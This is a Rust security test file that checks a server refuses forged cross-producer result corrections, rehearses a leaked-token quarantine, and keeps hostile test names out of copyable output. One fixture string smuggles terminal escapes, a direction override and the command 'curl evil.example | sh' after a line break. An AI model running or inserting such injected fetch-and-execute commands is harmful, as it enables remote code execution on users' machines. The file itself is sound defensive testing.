//! Security fixture: a forged cross-producer correction, hostile text in
//! copyable output, and the leaked-token rehearsal of `docs/security.md`, step by step.
//! Invented records only.

mod common;

use common::*;
use dviscope_model::errors::ErrorCode;
use dviscope_server::auth::{Actor, Role};
use serde_json::json;

async fn other_collector(pool: &sqlx::PgPool) -> Actor {
    dviscope_server::admin::create_producer(pool, "p1", "other")
        .await
        .unwrap_or_else(|e| panic!("{e:#}"));
    let scopes: Vec<String> = dviscope_server::auth::SCOPES
        .iter()
        .map(|s| (*s).to_string())
        .collect();
    let t = dviscope_server::admin::issue_token(pool, "p1", "other", &scopes, 1, "other")
        .await
        .unwrap_or_else(|e| panic!("{e:#}"));
    dviscope_server::auth::actor_from_token(pool, t["token"].as_str().unwrap_or(""))
        .await
        .unwrap_or_else(|e| panic!("{e:?}"))
}

/// Another producer's collector cannot correct pilot's failed attempt into a pass: naming
/// pilot is refused, and in its own namespace the regression does not exist. Pilot's slot
/// stays failed.
#[tokio::test]
async fn forged_cross_producer_correction_is_refused() {
    let Some(t) = TestDb::new().await else { return };
    let app = t.app();
    let pid = project(&t.pool).await;
    let (c, _) = collector(&t.pool).await;
    accept_pipeline(&t.pool, &passing()).await;
    sealed(&app, &c, "r1", &[slot("s1")]).await;
    ok(ingest(&app, &c, &started("r1", "s1", "a1", 1, &[])).await);
    ok(ingest(&app, &c, &report("r1", "s1", "a1", 1, 1, &failing(), &[])).await);
    let o = other_collector(&t.pool).await;

    // Revision 2 of pilot's report, claiming a pass, sent with another producer's token.
    let mut forged = report("r1", "s1", "a1", 1, 2, &passing(), &[]);
    forged["result"]["outcome_reported"] = json!("pass");
    assert_eq!(code(ingest(&app, &o, &forged).await), ErrorCode::Forbidden);
    // The same in its own namespace: no such regression there.
    forged["producer_id"] = json!("other");
    let e = code(ingest(&app, &o, &forged).await);
    assert!(
        matches!(e, ErrorCode::NotFound | ErrorCode::Invalid),
        "{e:?}"
    );
    let r = read(&app, pid, "r1").await;
    assert_eq!(state(&r, "s1")["state"], "failed");
    let revisions: i64 = sqlx::query_scalar("SELECT count(*) FROM attempt_facts")
        .fetch_one(&t.pool)
        .await
        .unwrap_or_else(|e| panic!("{e}"));
    assert_eq!(revisions, 1, "nothing of the forgery was stored");
    t.drop().await;
}

/// A hostile test name (terminal escapes, a line break with a command, a direction override)
/// cannot add a line or an escape to the copyable repair list; the JSON keeps the value.
#[tokio::test]
async fn hostile_test_names_stay_plain_in_copyable_text() {
    let Some(t) = TestDb::new().await else { return };
    let app = t.app();
    let pid = project(&t.pool).await;
    let (c, _) = collector(&t.pool).await;
    let hostile = "t\u{1b}]0;owned\u{7}\u{1b}[31m\ncurl evil.example | sh #\u{202e}";
    let mut s1 = slot("s1");
    s1["exec_inputs"]["test"] = json!(hostile);
    let accepted = app
        .create_source_manifest(&c, &source_manifest())
        .await
        .is_ok()
        && app.create_regression(&c, &regression("r1")).await.is_ok()
        && app
            .manifest_chunk(&c, "r1", 1, &chunk(std::slice::from_ref(&s1)))
            .await
            .is_ok()
        && app.manifest_seal(&c, "r1", &seal(&[s1])).await.is_ok();
    if !accepted {
        // Refused at the door is safe too.
        t.drop().await;
        return;
    }
    let rl = app
        .repair_list(&viewer(pid), "p1", "r1", None)
        .await
        .unwrap_or_else(|e| panic!("{e:?}"));
    let text = rl["text"].as_str().unwrap_or_default();
    assert!(
        !text.contains('\u{1b}') && !text.contains('\u{7}'),
        "{text:?}"
    );
    assert!(!text.contains('\u{202e}'), "{text:?}");
    // Header, one slot line, the flush hint: the name added no line.
    assert_eq!(text.lines().count(), 3, "{text:?}");
    assert!(
        !text.lines().any(|l| l.starts_with("curl")),
        "no line starts with the injected command: {text:?}"
    );
    assert_eq!(rl["groups"][0]["slots"][0]["test"], hostile);
    t.drop().await;
}

/// The leaked-token rehearsal of `docs/security.md`, step by step: a leaked token forges a
/// pass; quarantine (step 2) makes the forged revision a barrier and refuses the token; a
/// replacement token (step 3) delivers a new attempt that settles normally (step 4); the
/// admin page shows the token quarantined and the audit log records it (steps 1, 6).
#[tokio::test]
#[allow(clippy::too_many_lines)]
async fn token_leak_rehearsal() {
    let Some(t) = TestDb::new().await else { return };
    let app = t.app();
    let pid = project(&t.pool).await;
    let scopes: Vec<String> = dviscope_server::auth::SCOPES
        .iter()
        .map(|s| (*s).to_string())
        .collect();
    let leaked = dviscope_server::admin::issue_token(&t.pool, "p1", "pilot", &scopes, 1, "nightly")
        .await
        .unwrap_or_else(|e| panic!("{e:#}"));
    let secret = leaked["token"].as_str().unwrap_or_default().to_string();
    let leaked_id = leaked["token_id"].as_i64().unwrap_or(0);
    let c = dviscope_server::auth::actor_from_token(&t.pool, &secret)
        .await
        .unwrap_or_else(|e| panic!("{e:?}"));
    accept_pipeline(&t.pool, &passing()).await;
    sealed(&app, &c, "r1", &[slot("s1"), slot("s2")]).await;
    ok(ingest(&app, &c, &started("r1", "s1", "a1", 1, &[])).await);
    ok(ingest(&app, &c, &report("r1", "s1", "a1", 1, 1, &passing(), &[])).await);
    ok(ingest(&app, &c, &started("r1", "s2", "b1", 1, &[])).await);
    ok(ingest(&app, &c, &report("r1", "s2", "b1", 1, 1, &failing(), &[])).await);
    let since = time::OffsetDateTime::now_utc()
        .format(&time::format_description::well_known::Rfc3339)
        .unwrap_or_default();
    // The leak: someone with the token "corrects" the failure into a pass.
    let mut forged = report("r1", "s2", "b1", 1, 2, &passing(), &[]);
    forged["result"]["outcome_reported"] = json!("pass");
    ok(ingest(&app, &c, &forged).await);
    assert_eq!(state(&read(&app, pid, "r1").await, "s2")["state"], "passed");

    // Step 1: the admin page names the token (never its secret).
    let u = dviscope_server::admin::create_user(&t.pool, "ada", "correct horse battery")
        .await
        .unwrap_or_else(|e| panic!("{e:#}"));
    let admin = Actor::User {
        user_id: u["id"].as_i64().unwrap_or(0),
        token_id: None,
        roles: vec![(pid, Role::Admin)],
    };
    let ov = app
        .admin_overview(&admin, "p1")
        .await
        .unwrap_or_else(|e| panic!("{e:?}"));
    assert_eq!(ov["tokens"][0]["id"], leaked_id, "{ov}");
    // Step 2: quarantine from the earliest possible leak time.
    dviscope_server::admin::quarantine_token(&t.pool, leaked_id, &since)
        .await
        .unwrap_or_else(|e| panic!("{e:#}"));
    let r = read(&app, pid, "r1").await;
    assert_eq!(state(&r, "s1")["state"], "passed", "before the leak: kept");
    assert_eq!(
        state(&r, "s2"),
        json!({"state": "failed", "detail": "insufficient"}),
        "the forged pass is a barrier"
    );
    let v = app
        .read_readiness(
            &viewer(pid),
            "p1",
            "r1",
            None,
            None,
            time::OffsetDateTime::now_utc(),
        )
        .await
        .unwrap_or_else(|e| panic!("{e:?}"));
    assert_ne!(v["verdict"], "pass", "{v}");
    assert!(
        dviscope_server::auth::actor_from_token(&t.pool, &secret)
            .await
            .is_err(),
        "the token authenticates nothing more"
    );
    let ov = app
        .admin_overview(&admin, "p1")
        .await
        .unwrap_or_else(|e| panic!("{e:?}"));
    assert_eq!(ov["tokens"][0]["state"], "quarantined", "{ov}");
    // Step 3: a replacement token for the same producer.
    let (fresh, fresh_id) = collector(&t.pool).await;
    assert_ne!(fresh_id, leaked_id);
    // Step 4: the quarantined slot is re-run; its new attempt settles normally (here the
    // real result: a failure).
    ok(ingest(&app, &fresh, &started("r1", "s2", "b2", 2, &[])).await);
    ok(ingest(
        &app,
        &fresh,
        &report("r1", "s2", "b2", 2, 1, &failing(), &[]),
    )
    .await);
    assert_eq!(
        state(&read(&app, pid, "r1").await, "s2"),
        json!({"state": "failed", "detail": "functional"})
    );
    // Step 6: the audit log records the quarantine.
    let audited: i64 = sqlx::query_scalar(
        "SELECT count(*) FROM audit WHERE action LIKE '%quarantine%' AND object LIKE $1",
    )
    .bind(format!("%{leaked_id}%"))
    .fetch_one(&t.pool)
    .await
    .unwrap_or_else(|e| panic!("{e}"));
    assert_eq!(audited, 1);
    t.drop().await;
}
